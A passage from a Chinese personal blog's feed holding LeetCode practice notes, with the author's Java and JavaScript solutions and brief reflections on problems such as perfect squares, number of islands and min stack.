在进行第三步的过程中，高的人的数据肯定是先被存入集合的，所以每当我们取出一行数据，集合中已有的元素的身高肯定都是大于等于当前元素的身高的，所以当我们取出p[]数组后，发现前面应该有p[1]个人比自己高或者高度和自己相同，那么当前元素就应该排在集合的p[1]下标的位置(仔细想想是不是)，好比说目前有一个队列的人，这些人要么比你高，要么和你一样高，现在要你插入入队中，保证你前面有p[1]个人的身高大于等于你，你是不是应该排在索引为p[1]的位置</p><p>所以经过第三步的插入操作后，把每个人都插入到了正确的位置，所以根据这个集合转换的二维数组当然就是正确结果了。</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[][] reconstructQueue(<span class="hljs-keyword">int</span>[][] people) &#123;        Arrays.sort(people,<span class="hljs-keyword">new</span> Comparator&lt;<span class="hljs-keyword">int</span>[]&gt;() &#123;            <span class="hljs-meta">@Override</span>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] o1, <span class="hljs-keyword">int</span>[] o2)</span> </span>&#123;                <span class="hljs-keyword">return</span> o1[<span class="hljs-number">0</span>]==o2[<span class="hljs-number">0</span>]?o1[<span class="hljs-number">1</span>]-o2[<span class="hljs-number">1</span>]:o2[<span class="hljs-number">0</span>]-o1[<span class="hljs-number">0</span>];            &#125;        &#125;);        List&lt;<span class="hljs-keyword">int</span>[]&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span>[] p:people) res.add(p[<span class="hljs-number">1</span>],p);        <span class="hljs-keyword">int</span> n = people.length;        <span class="hljs-keyword">return</span> res.toArray(<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n][<span class="hljs-number">2</span>]);    &#125;&#125;</code></pre></div><h3 id="完全平方数"><a href="#完全平方数" class="headerlink" title="完全平方数"></a><a href="https://leetcode-cn.com/problems/perfect-squares/" target="_blank" rel="noopener">完全平方数</a></h3><p>这题也能动态规划。。时间复杂度为n*n^1/2，官解中有n^1/2的方法(数学方案)</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">numSquares</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;        <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n+<span class="hljs-number">1</span>];        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) &#123;            dp[i] = i;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">1</span>;i-j*j&gt;=<span class="hljs-number">0</span>;j++)                dp[i] = Math.min(dp[i],dp[i-j*j]+<span class="hljs-number">1</span>);        &#125;        <span class="hljs-keyword">return</span> dp[n];    &#125;&#125;</code></pre></div><h3 id="路径总和-III"><a href="#路径总和-III" class="headerlink" title="路径总和 III"></a><a href="https://leetcode-cn.com/problems/path-sum-iii/" target="_blank" rel="noopener">路径总和 III</a></h3><p>自己是用了两层递归，因为只用DFS函数的话某个节点作为起点递归到下一层时它的子节点还可以作为起点递归，而另一边这个节点作为中间节点递归的函数中它的子节点也被作为起点的函数调用，如果这个子节点是终点的话那就是重复计数了两次</p><p>题解中的思路是用前缀和，使用一个map存放从根节点到当前节点之前的所有前缀和及其计数。这样在遍历到当前节点时，无需二重DFS，直接通过求目标差值，这个差值如果是之前某个节点作为终点的路径和，那一定在map中有存放，并且value就是这个值的个数，O(1)时间即可得到以当前节点为目标和路径末尾的路径总数。</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for a binary tree node.</span><span class="hljs-comment"> * public class TreeNode &#123;</span><span class="hljs-comment"> *     int val;</span><span class="hljs-comment"> *     TreeNode left;</span><span class="hljs-comment"> *     TreeNode right;</span><span class="hljs-comment"> *     TreeNode() &#123;&#125;</span><span class="hljs-comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span><span class="hljs-comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span><span class="hljs-comment"> *         this.val = val;</span><span class="hljs-comment"> *         this.left = left;</span><span class="hljs-comment"> *         this.right = right;</span><span class="hljs-comment"> *     &#125;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">pathSum</span><span class="hljs-params">(TreeNode root, <span class="hljs-keyword">int</span> sum)</span> </span>&#123;        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        helper(root,sum);        <span class="hljs-keyword">return</span> res;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">helper</span><span class="hljs-params">(TreeNode root, <span class="hljs-keyword">int</span> sum)</span> </span>&#123;        dfs(root,sum,<span class="hljs-number">0</span>);        <span class="hljs-keyword">if</span>(root.left != <span class="hljs-keyword">null</span>) helper(root.left,sum);        <span class="hljs-keyword">if</span>(root.right != <span class="hljs-keyword">null</span>) helper(root.right,sum);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(TreeNode root, <span class="hljs-keyword">int</span> sum, <span class="hljs-keyword">int</span> now)</span> </span>&#123;        now += root.val;        <span class="hljs-keyword">if</span>(sum == now) res++;        <span class="hljs-keyword">if</span>(root.left != <span class="hljs-keyword">null</span>) dfs(root.left,sum,now);        <span class="hljs-keyword">if</span>(root.right != <span class="hljs-keyword">null</span>) dfs(root.right,sum,now);    &#125;&#125;</code></pre></div><h3 id="分割等和子集"><a href="#分割等和子集" class="headerlink" title="分割等和子集"></a><a href="https://leetcode-cn.com/problems/partition-equal-subset-sum/" target="_blank" rel="noopener">分割等和子集</a></h3><p>不会做，背包问题</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">canPartition</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;        <span class="hljs-keyword">int</span> len = nums.length;        <span class="hljs-keyword">if</span>(len == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num:nums) sum += num;        <span class="hljs-keyword">if</span>(sum%<span class="hljs-number">2</span> == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        <span class="hljs-keyword">int</span> target = sum/<span class="hljs-number">2</span>;        <span class="hljs-keyword">boolean</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">boolean</span>[target+<span class="hljs-number">1</span>];        dp[<span class="hljs-number">0</span>]=<span class="hljs-keyword">true</span>;        <span class="hljs-keyword">if</span>(nums[<span class="hljs-number">0</span>]&lt;=target) dp[nums[<span class="hljs-number">0</span>]] = <span class="hljs-keyword">true</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;len;i++) &#123;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=target;nums[i]&lt;=j;j--) &#123;                <span class="hljs-keyword">if</span>(dp[target]) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;                dp[j] = dp[j] || dp[j-nums[i]];            &#125;        &#125;        <span class="hljs-keyword">return</span> dp[target];    &#125;&#125;</code></pre></div><h3 id="回文子串"><a href="#回文子串" class="headerlink" title="回文子串"></a><a href="https://leetcode-cn.com/problems/palindromic-substrings/" target="_blank" rel="noopener">回文子串</a></h3><p>动态规划加空间优化，<code>dp[i][j]</code>表示由i到j位置的子串是否是回文串，若<code>j=i或j-i=1且s[i]=s[j]时</code>，它当然是回文串，但如果j与i相隔较远，则需要看<code>s[j]与s[i]是否相等，且dp[i+1][j-1]是否是回文串</code></p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">countSubstrings</span><span class="hljs-params">(String s)</span> </span>&#123;        <span class="hljs-keyword">int</span> n = s.length();        <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;        <span class="hljs-keyword">boolean</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">boolean</span>[n];        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++) &#123;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;=j;i++) &#123;                <span class="hljs-keyword">if</span>(s.charAt(i)==s.charAt(j) &amp;&amp; (j-i&lt;=<span class="hljs-number">1</span> || dp[i+<span class="hljs-number">1</span>])) &#123;                    dp[i] = <span class="hljs-keyword">true</span>;                    res++;                &#125;                <span class="hljs-keyword">else</span> dp[i] = <span class="hljs-keyword">false</span>;            &#125;        &#125;        <span class="hljs-keyword">return</span> res;    &#125;&#125;</code></pre></div><p>开始用JS做题吧，感觉需要提升JS的熟练度</p><h3 id="回文链表"><a href="#回文链表" class="headerlink" title="回文链表"></a><a href="https://leetcode-cn.com/problems/palindrome-linked-list/" target="_blank" rel="noopener">回文链表</a></h3><p>官解的话：避免使用 O(n)额外空间的方法就是改变输入，所以用快慢指针找到中间节点，同时反转前面或后面的链表，之后按个比较，但官方多了将链表恢复原状，因为实际写成函数后使用者不会想要在调用函数后原链表被改变</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for singly-linked list.</span><span class="hljs-comment"> * function ListNode(val) &#123;</span><span class="hljs-comment"> *     this.val = val;</span><span class="hljs-comment"> *     this.next = null;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;ListNode&#125;</span> <span class="hljs-variable">head</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;boolean&#125;</span></span></span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> isPalindrome = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">head</span>) </span>&#123;    <span class="hljs-keyword">if</span>(head==<span class="hljs-literal">null</span> || head.next==<span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    <span class="hljs-keyword">let</span> mid = head;    <span class="hljs-keyword">let</span> pre = <span class="hljs-literal">null</span>;    <span class="hljs-keyword">let</span> reverse = <span class="hljs-literal">null</span>;    <span class="hljs-keyword">while</span>(head!=<span class="hljs-literal">null</span> &amp;&amp; head.next!=<span class="hljs-literal">null</span>) &#123;        pre = mid;        mid = mid.next;        head = head.next.next;        pre.next = reverse;        reverse = pre;    &#125;    <span class="hljs-keyword">if</span>(head) mid = mid.next;    <span class="hljs-keyword">while</span>(mid) &#123;        <span class="hljs-keyword">if</span>(reverse.val != mid.val) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        reverse = reverse.next;        mid = mid.next;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;;</code></pre></div><h3 id="岛屿数量"><a href="#岛屿数量" class="headerlink" title="岛屿数量"></a><a href="https://leetcode-cn.com/problems/number-of-islands/" target="_blank" rel="noopener">岛屿数量</a></h3><p>官解中的并查集写的很棒，DFS和BFS都可以，遍历到值为1的点时开始找这个点所在的连通分量并将其中包含的所有点都变为0，不影响之后寻找其他连通分量，最后岛屿的数量就是连通分量的个数</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;character[][]&#125;</span> <span class="hljs-variable">grid</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;number&#125;</span></span></span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> numIslands = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">grid</span>) </span>&#123;    <span class="hljs-keyword">const</span> rows = grid.length;    <span class="hljs-keyword">if</span>(rows==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-keyword">const</span> cols = grid[<span class="hljs-number">0</span>].length;    <span class="hljs-keyword">let</span> res = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;rows;i++) &#123;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> j=<span class="hljs-number">0</span>;j&lt;cols;j++) &#123;            <span class="hljs-keyword">if</span>(grid[i][j] == <span class="hljs-string">"1"</span>) &#123;                dfs(grid,i,j,rows,cols);                res++;            &#125;        &#125;    &#125;    <span class="hljs-keyword">return</span> res;&#125;;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dfs</span>(<span class="hljs-params">grid,i,j,rows,cols</span>) </span>&#123;    <span class="hljs-keyword">if</span>(i&lt;<span class="hljs-number">0</span> || j&lt;<span class="hljs-number">0</span> || i&gt;rows<span class="hljs-number">-1</span> || j&gt;cols<span class="hljs-number">-1</span> || grid[i][j]==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;    grid[i][j] = <span class="hljs-string">"0"</span>;    dfs(grid,i+<span class="hljs-number">1</span>,j,rows,cols);    dfs(grid,i<span class="hljs-number">-1</span>,j,rows,cols);    dfs(grid,i,j+<span class="hljs-number">1</span>,rows,cols);    dfs(grid,i,j<span class="hljs-number">-1</span>,rows,cols);&#125;</code></pre></div><h3 id="移动零"><a href="#移动零" class="headerlink" title="移动零"></a><a href="https://leetcode-cn.com/problems/move-zeroes/" target="_blank" rel="noopener">移动零</a></h3><p>自己用双指针，向后找第一个0用i标记，i之后的第一个非0用j标记，交换二者，与官解区别在于交换次数少，主动找0，官解即使是i与j指向同一个非0元素也会交换</p><p>官解：从index=0开始，j指向元素不为0时与i指向元素交换，二者加一，指向为0时i不动j加一</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;number[]&#125;</span> <span class="hljs-variable">nums</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;void&#125;</span> </span>Do not return anything, modify nums in-place instead.</span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> moveZeroes = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">nums</span>) </span>&#123;    <span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;    <span class="hljs-keyword">let</span> j=<span class="hljs-number">0</span>;    <span class="hljs-keyword">let</span> len=nums.length;    <span class="hljs-keyword">while</span>(j&lt;len) &#123;        <span class="hljs-keyword">while</span>(i&lt;len &amp;&amp; nums[i]!=<span class="hljs-number">0</span>) i++;        j=i;        <span class="hljs-keyword">while</span>(j&lt;len &amp;&amp; nums[j]==<span class="hljs-number">0</span>) j++;        <span class="hljs-keyword">if</span>(j&lt;len) help(nums,i,j);    &#125;&#125;;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">help</span>(<span class="hljs-params">nums,i,j</span>) </span>&#123;    <span class="hljs-keyword">let</span> tmp = nums[i];    nums[i] = nums[j];    nums[j] = tmp;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">var moveZeroes = function(nums) &#123;</span><span class="hljs-comment">    let i=0;</span><span class="hljs-comment">    let j=0;</span><span class="hljs-comment">    let len=nums.length;</span><span class="hljs-comment">    for(j=0;j&lt;len;j++) &#123;</span><span class="hljs-comment">        if(nums[j]!=0) swap(i++,j);</span><span class="hljs-comment">    &#125;</span><span class="hljs-comment">&#125;</span><span class="hljs-comment">*/</span></code></pre></div><h3 id="最小栈"><a href="#最小栈" class="headerlink" title="最小栈"></a><a href="https://leetcode-cn.com/problems/min-stack/" target="_blank" rel="noopener">最小栈</a></h3><p>和之前做过的思路不同在于，每次新进栈的元素都和最小栈的栈顶元素比较一个最小值后决定，不论是哪个最小栈元素都会新增，所以在出栈时只要同时删除最小栈和主栈的栈顶就可以(不用担心会将最小元素删掉，因为如果主栈删掉的不是它，那最小栈删掉的也只是其复制体，主体还在下面)</p><p>顺便提一下JS的原型链是干嘛的来着。。。</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * initialize your data structure here.</span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> MinStack = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">this</span>.x_stack = [];    <span class="hljs-keyword">this</span>.min_stack = [<span class="hljs-literal">Infinity</span>];&#125;;<span class="hljs-comment">/** </span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;number&#125;</span> <span class="hljs-variable">x</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;void&#125;</span></span></span><span class="hljs-comment"> */</span>MinStack.prototype.push = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">x</span>) </span>&#123;    <span class="hljs-keyword">this</span>.x_stack.push(x);    <span class="hljs-keyword">this</span>.min_stack.push(<span class="hljs-built_in">Math</span>.min(<span class="hljs-keyword">this</span>.min_stack[<span class="hljs-keyword">this</span>.min_stack.length<span class="hljs-number">-1</span>],x));&#125;;<span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;void&#125;</span></span></span><span class="hljs-comment"> */</span>MinStack.prototype.pop = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">this</span>.x_stack.pop();    <span class="hljs-keyword">this</span>.min_stack.pop();&#125;;<span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;number&#125;</span></span></span><span class="hljs-comment"> */</span>MinStack.prototype.top = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.x_stack[<span class="hljs-keyword">this</span>.x_stack.length<span class="hljs-number">-1</span>];&#125;;<span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;number&#125;</span></span></span><span class="hljs-comment"> */</span>MinStack.prototype.getMin = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.min_stack[<span class="hljs-keyword">this</span>.min_stack.length<span class="hljs-number">-1</span>];&#125;;<span class="hljs-comment">/**</span><span class="hljs-comment"> * Your MinStack object will be instantiated and called as such:</span><span class="hljs-comment"> * var obj = new MinStack()</span><span class="hljs-comment"> * obj.push(x)</span><span class="hljs-comment"> * obj.pop()</span><span class="hljs-comment"> * var param_3 = obj.top()</span><span class="hljs-comment"> * var param_4 = obj.getMin()</span><span class="hljs-comment"> */</span></code></pre></div><h3 id="合并二叉树"><a href="#合并二叉树" class="headerlink" title="合并二叉树"></a><a href="https://leetcode-cn.com/problems/merge-two-binary-trees/" target="_blank" rel="noopener">合并二叉树</a></h3><p>JS新建对象怎么做？</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for a binary tree node.</span><span class="hljs-comment"> * function TreeNode(val) &#123;</span><span class="hljs-comment"> *     this.val = val;</span><span class="hljs-comment"> *     this.left = this.right = null;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;TreeNode&#125;</span> <span class="hljs-variable">t1</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;TreeNode&#125;</span> <span class="hljs-variable">t2</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;TreeNode&#125;</span></span></span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> mergeTrees = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">t1, t2</span>) </span>&#123;    <span class="hljs-keyword">if</span>(t1==<span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> t2;    <span class="hljs-keyword">if</span>(t2==<span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> t1;    <span class="hljs-keyword">var</span> res = <span class="hljs-keyword">new</span> TreeNode(<span class="hljs-number">0</span>);    res.val = t1.val + t2.val;    res.left = mergeTrees(t1.left,t2.left);    res.right = mergeTrees(t1.right,t2.right);    <span class="hljs-keyword">return</span> res;&#125;;</code></pre></div><h3 id="乘积最大子数组"><a href="#乘积最大子数组" class="headerlink" title="乘积最大子数组"></a><a href="https://leetcode-cn.com/problems/maximum-product-subarray/" target="_blank" rel="noopener">乘积最大子数组</a></h3><p>DP</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;number[]&#125;</span> <span class="hljs-variable">nums</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;number&#125;</span></span></span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> maxProduct = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">nums</span>) </span>&#123;    <span class="hljs-keyword">let</span> res = nums[<span class="hljs-number">0</span>];    <span class="hljs-keyword">let</span> max = nums[<span class="hljs-number">0</span>];    <span class="hljs-keyword">let</span> min = nums[<span class="hljs-number">0</span>];    <span class="hljs-keyword">let</span> len = nums.length;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">1</span>;i&lt;len;i++) &#123;        <span class="hljs-keyword">let</span> pre_max = max;        max = <span class="hljs-built_in">Math</span>.max(<span class="hljs-built_in">Math</span>.max(max*nums[i],min*nums[i]),nums[i]);        min = <span class="hljs-built_in">Math</span>.min(<span class="hljs-built_in">Math</span>.min(pre_max*nums[i],min*nums[i]),nums[i]);        res = <span class="hljs-built_in">Math</span>.max(res,max);    &#125;    <span class="hljs-keyword">return</span> res;&#125;;</code></pre></div><h3 id="最大正方形"><a href="#最大正方形" class="headerlink" title="最大正方形"></a><a href="https://leetcode-cn.com/problems/maximal-square/" target="_blank" rel="noopener">最大正方形</a></h3><p>DP，记录每一个点作为正方形的右下角能完成的最大边长，就是它上方，左方，左上方三个点能完成边长的最小值，滚动数组优化</p><p>JS申请数组的方式好奇怪。。</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;character[][]&#125;</span> <span class="hljs-variable">matrix</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;number&#125;</span></span></span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> maximalSquare = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">matrix</span>) </span>&#123;    <span class="hljs-keyword">let</span> m = matrix.length;    <span class="hljs-keyword">if</span>(m==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-keyword">let</span> n = matrix[<span class="hljs-number">0</span>].length;    <span class="hljs-keyword">var</span> dp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();    <span class="hljs-keyword">let</span> tmp = <span class="hljs-number">0</span>;    <span class="hljs-keyword">let</span> tmp2 = <span class="hljs-number">0</span>;    <span class="hljs-keyword">let</span> res = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;=n;i++) dp[i] = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;m;i++) &#123;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++) &#123;            <span class="hljs-keyword">if</span>(matrix[i][j<span class="hljs-number">-1</span>] == <span class="hljs-string">'0'</span>) &#123;                dp[j] = <span class="hljs-number">0</span>;                <span class="hljs-keyword">continue</span>;            &#125;            tmp2 = dp[j];            dp[j] = <span class="hljs-built_in">Math</span>.min(tmp,<span class="hljs-built_in">Math</span>.min(dp[j],dp[j<span class="hljs-number">-1</span>])) + <span class="hljs-number">1</span>;            tmp = tmp2;            res = <span class="hljs-built_in">Math</span>.max(res,dp[j]);        &#125;    &#125;    <span class="hljs-keyword">return</span> res*res;&#125;;</code></pre></div><h3 id="多数元素"><a href="#多数元素" class="headerlink" title="多数元素"></a><a href="https://leetcode-cn.com/problems/majority-element/" target="_blank" rel="noopener">多数元素</a></h3><p>摩尔投票！</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;number[]&#125;</span> <span class="hljs-variable">nums</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;number&#125;</span></span></span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> majorityElement = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">nums</span>) </span>&#123;    <span class="hljs-keyword">let</span> res = <span class="hljs-number">0</span>;    <span class="hljs-keyword">let</span> len = nums.length;    <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;len;i++) &#123;        <span class="hljs-keyword">if</span>(count == <span class="hljs-number">0</span>) res = nums[i];        count += res==nums[i]?<span class="hljs-number">1</span>:<span class="hljs-number">-1</span>;    &#125;    <span class="hljs-keyword">return</span> res;&#125;;</code></pre></div><h3 id="二叉树的最近公共祖先"><a href="#二叉树的最近公共祖先" class="headerlink" title="二叉树的最近公共祖先"></a><a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree/" target="_blank" rel="noopener">二叉树的最近公共祖先</a></h3><p>做过的还是不会做。。</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for a binary tree node.</span><span class="hljs-comment"> * function TreeNode(val) &#123;</span><span class="hljs-comment"> *     this.val = val;</span><span class="hljs-comment"> *     this.left = this.right = null;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;TreeNode&#125;</span> <span class="hljs-variable">root</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;TreeNode&#125;</span> <span class="hljs-variable">p</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;TreeNode&#125;</span> <span class="hljs-variable">q</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;TreeNode&#125;</span></span></span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> lowestCommonAncestor = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">root, p, q</span>) </span>&#123;    <span class="hljs-keyword">if</span>(root==<span class="hljs-literal">null</span> || root==p || root==q) <span class="hljs-keyword">return</span> root;    <span class="hljs-keyword">let</span> left = lowestCommonAncestor(root.left,p,q);    <span class="hljs-keyword">let</span> right = lowestCommonAncestor(root.right,p,q);    <span class="hljs-keyword">if</span>(left == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> right;    <span class="hljs-keyword">if</span>(right == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> left;    <span class="hljs-keyword">return</span> root;&#125;;</code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;9月做题记录&quot;&gt;&lt;a href=&quot;#9月做题记录&quot; class=&quot;headerlink&quot; title=&quot;9月做题记录&quot;&gt;&lt;/a&gt;9月做题记录&lt;/h1&gt;&lt;h3 id=&quot;单词搜索&quot;&gt;&lt;a href=&quot;#单词搜索&quot; class=&quot;headerlink&quot; title=&quot;单</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
    <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
    <category term="HOT100" scheme="http://yoursite.com/tags/HOT100/"/>
    
  </entry>
  
  <entry>
    <title>8月做题记录</title>
